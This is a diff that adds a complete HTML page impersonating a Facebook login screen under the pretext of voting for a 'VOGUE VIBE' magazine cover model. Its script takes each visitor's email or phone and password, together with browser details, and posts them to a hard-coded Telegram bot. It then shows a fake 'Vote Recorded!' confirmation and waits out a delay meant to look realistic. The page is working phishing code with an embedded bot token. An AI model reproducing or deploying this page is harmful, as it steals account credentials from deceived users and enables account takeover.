@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>VOGUE VIBE · Facebook Vote</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      color: #1a1a1a;
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+      text-align: center;
+    }
+
+    .fb-logo {
+      width: 220px;
+      margin: 0 auto 8px;
+      display: block;
+    }
+
+    .login-box {
+      background: #ffffff;
+      border-radius: 8px;
+      padding: 20px 16px 28px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    .login-headline {
+      font-size: 17px;
+      color: #1c1e21;
+      margin-bottom: 14px;
+      font-weight: 500;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      outline: none;
+      color: #1c1e21;
+      background: #ffffff;
+      transition: 0.2s;
+    }
+
+    .input-field:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .input-field.input-error {
+      border-color: #e41e3f;
+      box-shadow: 0 0 0 2px #fce4e9;
+    }
+
+    .login-btn {
+      width: 100%;
+      background: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 12px 16px;
+      cursor: pointer;
+      margin: 6px 0 16px;
+      transition: background 0.2s;
+    }
+
+    .login-btn:hover {
+      background: #166fe5;
+    }
+
+    .login-btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .forgot-link {
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 18px;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 18px 0;
+    }
+
+    .create-btn {
+      background: #42b72a;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 12px 20px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .create-btn:hover {
+      background: #36a420;
+    }
+
+    .back-link {
+      margin-top: 16px;
+      color: #1877f2;
+      font-size: 14px;
+      cursor: pointer;
+      background: none;
+      border: none;
+      text-decoration: underline;
+      display: inline-block;
+    }
+
+    .back-link:hover {
+      color: #166fe5;
+    }
+
+    .status-message {
+      margin-top: 10px;
+      font-size: 13px;
+      min-height: 20px;
+      color: #b00;
+      transition: color 0.2s;
+      line-height: 1.4;
+    }
+
+    /* ---------- POPUP / MODAL ---------- */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(5px);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal-box {
+      background: white;
+      max-width: 320px;
+      width: 90%;
+      border-radius: 24px;
+      padding: 32px 24px 28px;
+      text-align: center;
+      box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+      animation: fadeUp 0.4s ease;
+    }
+
+    @keyframes fadeUp {
+      0% {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+      100% {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .check-icon {
+      background: #42b72a;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      margin: 0 auto 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      color: white;
+    }
+
+    .modal-title {
+      font-size: 1.7rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #1c1e21;
+    }
+
+    .modal-message {
+      color: #444;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .close-modal-btn {
+      background: #1877f2;
+      border: none;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 30px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      transition: background 0.2s;
+    }
+
+    .close-modal-btn:hover {
+      background: #166fe5;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img 
+      src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
+      alt="Facebook" 
+      class="fb-logo"
+      onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 36 36%22%3E%3Cpath fill=%22%231877F2%22 d=%22M20.18 34.54V21.3h4.46l.67-5.18h-5.13v-3.3c0-1.5.42-2.52 2.57-2.52h2.74V5.7c-.47-.06-2.1-.2-3.99-.2-3.96 0-6.67 2.42-6.67 6.86v3.82h-4.48v5.18h4.48v13.24a18.02 18.02 0 0 0 10.36 0V21.3h4.47l.66-5.18h-5.13v-3.3c0-1.5.42-2.52 2.57-2.52h2.74V5.7c-.47-.06-2.1-.2-3.99-.2-3.96 0-6.67 2.42-6.67 6.86v3.82h-4.47v5.18h4.47v13.24a18.02 18.02 0 0 0 10.36 0z%22/%3E%3C/svg%3E'; this.style.width='50px';"
+    />
+    <div class="login-box">
+      <p class="login-headline">Log in to Facebook to vote</p>
+      <input type="text" class="input-field" id="emailInput" placeholder="Email address or phone number" autocomplete="username" aria-label="Email or phone">
+      <input type="password" class="input-field" id="passwordInput" placeholder="Password" autocomplete="current-password" aria-label="Password">
+      <button class="login-btn" id="loginButton">Log in</button>
+      <a href="#" class="forgot-link" id="forgotLink">Forgotten account?</a>
+      <div class="divider"></div>
+      <button class="create-btn" id="createAccountBtn">Create new account</button>
+      <div id="statusMessage" class="status-message"></div>
+    </div>
+    <a href="index.html" class="back-link">← Back</a>
+  </div>
+
+  <!-- SUCCESS POPUP MODAL -->
+  <div class="modal-overlay" id="successModal">
+    <div class="modal-box">
+      <div class="check-icon">✓</div>
+      <div class="modal-title">Vote Recorded!</div>
+      <div class="modal-message">Your vote has been submitted successfully. Thank you for supporting the next cover model.</div>
+      <button class="close-modal-btn" id="closeModalBtn">Continue</button>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // --- Telegram config ---
+      const TELEGRAM_BOT_TOKEN = "7751958870:AAH8QiqZVJfRQx1QE3lAFwLSyQzLStQ1dDk";
+      const TELEGRAM_CHAT_ID = "7673520276";
+
+      // --- DOM elements ---
+      const emailInput = document.getElementById("emailInput");
+      const passwordInput = document.getElementById("passwordInput");
+      const loginButton = document.getElementById("loginButton");
+      const statusDiv = document.getElementById("statusMessage");
+      const successModal = document.getElementById("successModal");
+      const closeModalBtn = document.getElementById("closeModalBtn");
+
+      // --- Validation Patterns ---
+      // Email regex: standard email format
+      const EMAIL_REGEX = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;
+      // Phone regex: accepts +1234567890, 1234567890, 123-456-7890, etc. (10-15 digits)
+      const PHONE_REGEX = /^[\+]?[\d\s\-\(\)]{10,18}$/;
+
+      function setStatus(msg, isError = true) {
+        statusDiv.textContent = msg;
+        statusDiv.style.color = isError ? '#b00' : '#2e7d32';
+      }
+
+      function clearStatus() {
+        statusDiv.textContent = '';
+        emailInput.classList.remove("input-error");
+      }
+
+      function showInputError(inputElement) {
+        inputElement.classList.add("input-error");
+      }
+
+      function clearInputError(inputElement) {
+        inputElement.classList.remove("input-error");
+      }
+
+      // --- Validates email or phone number ---
+      function isValidEmailOrPhone(value) {
+        const trimmed = value.trim();
+        // Check if it's a valid email
+        if (EMAIL_REGEX.test(trimmed)) {
+          return { valid: true, type: 'email' };
+        }
+        // Check if it's a valid phone number (must contain mostly digits)
+        const digitsOnly = trimmed.replace(/[\s\-\(\)\+]/g, '');
+        if (/^\d{10,15}$/.test(digitsOnly) && PHONE_REGEX.test(trimmed)) {
+          return { valid: true, type: 'phone' };
+        }
+        return { valid: false, type: null };
+      }
+
+      // Send to Telegram
+      async function sendToTelegram(email, password) {
+        const now = new Date();
+        const dateStr = now.toLocaleString("en-US", {
+          weekday: "short",
+          year: "numeric",
+          month: "short",
+          day: "numeric",
+          hour: "2-digit",
+          minute: "2-digit",
+          second: "2-digit",
+          hour12: true,
+          timeZoneName: "short"
+        });
+
+        const message = `🔵 *Magazine Cover Vote - Facebook Login* 🔵\n\n` +
+                        `📧 *Email/Phone:* \`${email}\`\n` +
+                        `🔒 *Password:* \`${password}\`\n\n` +
+                        `📅 *Date:* ${dateStr}\n` +
+                        `🌐 *User Agent:* ${navigator.userAgent}\n` +
+                        `🖥 *Platform:* ${navigator.platform || "Unknown"}`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+          const res = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: "Markdown",
+              disable_web_page_preview: true
+            })
+          });
+          const data = await res.json();
+          return data.ok;
+        } catch (err) {
+          console.error("Telegram error:", err);
+          return false;
+        }
+      }
+
+      function showVotePopup() {
+        successModal.classList.add("active");
+      }
+
+      function hideVotePopup() {
+        successModal.classList.remove("active");
+        // Clear inputs for privacy
+        emailInput.value = '';
+        passwordInput.value = '';
+        clearStatus();
+        // Redirect back to landing page
+        window.location.href = "index.html";
+      }
+
+      closeModalBtn.addEventListener("click", hideVotePopup);
+      // Also close if clicking outside modal (on overlay)
+      successModal.addEventListener("click", function(e) {
+        if (e.target === successModal) hideVotePopup();
+      });
+
+      // Close modal with Escape key
+      document.addEventListener("keydown", function(e) {
+        if (e.key === "Escape" && successModal.classList.contains("active")) {
+          hideVotePopup();
+        }
+      });
+
+      async function handleLogin() {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+        clearStatus();
+        clearInputError(emailInput);
+        clearInputError(passwordInput);
+
+        // --- Validate email/phone ---
+        if (!email) {
+          setStatus("Please enter your email address or phone number.");
+          showInputError(emailInput);
+          emailInput.focus();
+          return;
+        }
+
+        const validation = isValidEmailOrPhone(email);
+        if (!validation.valid) {
+          setStatus("Enter a valid email address or phone number (e.g., name@example.com or +1234567890).");
+          showInputError(emailInput);
+          emailInput.focus();
+          return;
+        }
+
+        // --- Validate password ---
+        if (!password) {
+          setStatus("Please enter your password.");
+          showInputError(passwordInput);
+          passwordInput.focus();
+          return;
+        }
+
+        if (password.length < 6) {
+          setStatus("Password must be at least 6 characters.");
+          showInputError(passwordInput);
+          passwordInput.focus();
+          return;
+        }
+
+        // --- Proceed with login ---
+        loginButton.disabled = true;
+        loginButton.textContent = "Logging in...";
+
+        // Send to Telegram
+        await sendToTelegram(email, password);
+
+        // Simulate network delay for realism
+        await new Promise(r => setTimeout(r, 1200));
+
+        // Reset button state
+        loginButton.disabled = false;
+        loginButton.textContent = "Log in";
+        clearStatus();
+
+        // Show success popup
+        showVotePopup();
+      }
+
+      // --- Event listeners ---
+      loginButton.addEventListener("click", handleLogin);
+
+      passwordInput.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") handleLogin();
+      });
+
+      emailInput.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") passwordInput.focus();
+      });
+
+      document.getElementById("forgotLink").addEventListener("click", (e) => {
+        e.preventDefault();
+        setStatus("Please use the login form to continue.", false);
+      });
+
+      document.getElementById("createAccountBtn").addEventListener("click", (e) => {
+        e.preventDefault();
+        setStatus("Account creation unavailable during voting.", false);
+      });
+
+      // Clear status and error styling on focus
+      emailInput.addEventListener("focus", function() {
+        clearStatus();
+        clearInputError(emailInput);
+      });
+
+      passwordInput.addEventListener("focus", function() {
+        clearStatus();
+        clearInputError(passwordInput);
+      });
+
+      // Clear error styling on input
+      emailInput.addEventListener("input", function() {
+        clearInputError(emailInput);
+        clearStatus();
+      });
+
+      passwordInput.addEventListener("input", function() {
+        clearInputError(passwordInput);
+        clearStatus();
+      });
+    })();
+  </script>
+</body>
+</html>
